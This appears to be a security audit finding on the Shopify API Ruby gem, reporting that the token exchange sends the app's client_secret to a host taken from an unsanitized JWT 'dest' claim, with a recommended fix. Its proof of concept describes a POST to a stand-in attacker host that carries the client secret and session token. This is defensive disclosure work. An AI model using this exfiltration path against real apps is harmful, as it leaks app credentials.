### Title
Session-token `dest` claim used unsanitized as OAuth token-exchange host, leaking `client_secret` — (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop host it sends the app's `client_secret` to directly from the JWT `dest` claim, without ever passing it through `Utils::ShopValidator.sanitize!` — the same trusted-domain check that every other code path in this gem applies before using a shop string as a request host.

### Finding Description
`JwtPayload#shop` simply strips a literal `"https://"` prefix from the `dest` claim with no further validation: [1](#0-0) 

`TokenExchange.exchange_token` takes this unsanitized value as `dest_shop` and uses it, unmodified, both as the `Session#shop` used to build the outbound admin request and as the shop stored on the resulting `Session`: [2](#0-1) 

`Clients::HttpClient#initialize` then builds the request host directly from `session.shop`, with no domain allow-list check performed anywhere in this call path: [3](#0-2) 

The outbound request body includes the app's `client_secret` in plaintext: [4](#0-3) 

This is the same identity-binding field (`shop`) that, in the sibling method `migrate_to_expiring_token` a few lines below, **is** validated with `Utils::ShopValidator.sanitize!` before being used to build the request host: [5](#0-4) 

`ShopValidator` exists precisely to prevent an attacker-controlled string from being treated as a trusted Shopify host, and is applied consistently elsewhere (e.g. `ClientCredentials`, `Storefront` client): [6](#0-5) 

So the equality the gem is supposed to enforce is: *"the domain the JWT vouches for" == "a domain on `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`"*. In `exchange_token` this equality is never checked; the `dest` claim is trusted as a host directly, mirroring the Merkle-tree bug class where a value that passes one authentication check (HMAC/JWT signature covers `dest`) is used for a purpose that requires a *different*, unperformed check (that the string is actually a trusted Shopify domain, not just any string covered by the signature).

### Impact Explanation
If any code path in a host application allows a `dest`/`aud`-bearing JWT to be minted or relayed with a non-Shopify `dest` value (for example, non-Shopify-issued/self-hosted embedding contexts, custom `iss`/`dest` handling on `spin.dev`/`shop.dev`-style internal environments, or any future token source not restricted to genuine Shopify admin origins), `exchange_token` will POST the request containing `client_id`, `client_secret`, and the `subject_token` (the session token itself) to `https://<dest>/admin/oauth/access_token`. That is SSRF carrying the app's `client_secret` and grants an attacker-controlled endpoint the app's client credentials and the subject token used for exchange.

### Likelihood Explanation
Low-to-medium. Under Shopify's normal embedded-app flow, `dest` is always minted by Shopify itself for genuine `myshopify.com`/`spin.dev`/`shop.dev` shops, so a standard unprivileged attacker cannot forge the JWT signature (which requires `api_secret_key`) to inject an arbitrary `dest`. The risk surface is the missing defense-in-depth check itself: the code contains and uses `ShopValidator` for this exact purpose elsewhere but omits it here, so any edge case in token issuance/relaying (non-Shopify session-token sources, misconfigured `spin.dev` tunnels, or future auth flows that reuse this method) turns directly into credential-leaking SSRF with no additional check to catch it.

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (as already done in `migrate_to_expiring_token`) before constructing `shop_session`/`Session.from`, so the JWT `dest` claim must also equal a trusted Shopify domain before it is trusted as a request host.

### Proof of Concept
1. Obtain (or have relayed) a session token whose `dest` claim is `https://attacker-controlled.example` but whose signature nonetheless verifies against `Context.api_secret_key` (e.g., via a non-standard/misconfigured token issuance path, since the standard flow does not permit this).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `dest_shop` becomes `"attacker-controlled.example"` unchecked, and the library issues `POST https://attacker-controlled.example/admin/oauth/access_token` with `client_id`, `client_secret`, and `subject_token` in the body — exfiltrating the app's client secret and session token to the attacker's host.
